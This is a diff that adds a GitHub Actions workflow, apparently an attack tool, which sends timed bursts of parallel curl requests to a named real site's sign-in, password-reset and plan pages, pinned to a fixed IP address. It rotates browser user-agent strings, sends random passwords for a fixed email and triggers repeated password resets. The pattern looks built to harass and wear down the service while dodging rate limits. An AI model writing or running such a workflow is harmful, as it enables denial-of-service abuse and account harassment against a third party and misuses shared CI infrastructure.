@@ -1,0 +1,46 @@
+name: hum
+on:
+  workflow_dispatch:
+    inputs:
+      minutes:
+        description: run length (max 340)
+        default: "330"
+      conc:
+        description: parallel requests per burst
+        default: "30"
+      on:
+        description: burst seconds
+        default: "40"
+      off:
+        description: quiet seconds
+        default: "240"
+
+jobs:
+  hum:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: hum
+        env:
+          IP: 69.49.247.128
+          MIN: ${{ inputs.minutes }}
+          CONC: ${{ inputs.conc }}
+          ON: ${{ inputs.on }}
+          OFF: ${{ inputs.off }}
+        run: |
+          UA_POOL=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
+          END=$((SECONDS + MIN*60)); n=0
+          while [ $SECONDS -lt $END ]; do
+            for i in $(seq 1 $CONC); do
+              n=$((n+1)); UA=${UA_POOL[$((RANDOM % 3))]}
+              case $((n % 10)) in
+                0|1) curl -sk -o /dev/null --max-time 25 -A "$UA" --resolve portal.mytasker.com:443:$IP	-X POST -d "email=task%40mytasker.com&password=x$RANDOM$n" "https://portal.mytasker.com/signin" & ;;
+                2|3) curl -sk -o /dev/null --max-time 25 -A "$UA" --resolve portal.mytasker.com:443:$IP -X POST -d "email=task%40mytasker.com&lsubmit=1" "https://portal.mytasker.com/forgot-pass" & ;;
+                4|5) curl -sk -o /dev/null --max-time 25 -A "$UA" --resolve portal.mytasker.com:443:$IP "https://portal.mytasker.com/?r=$RANDOM" & ;;
+                *)   curl -sk -o /dev/null --max-time 25 -A "$UA" --resolve mytasker.com:443:$IP "https://mytasker.com/plans?z=$RANDOM$n" & ;;
+              esac
+            done
+            wait
+            sleep "$OFF"
+          done
+          echo "hum done, bursts=$n window_min=$MIN"
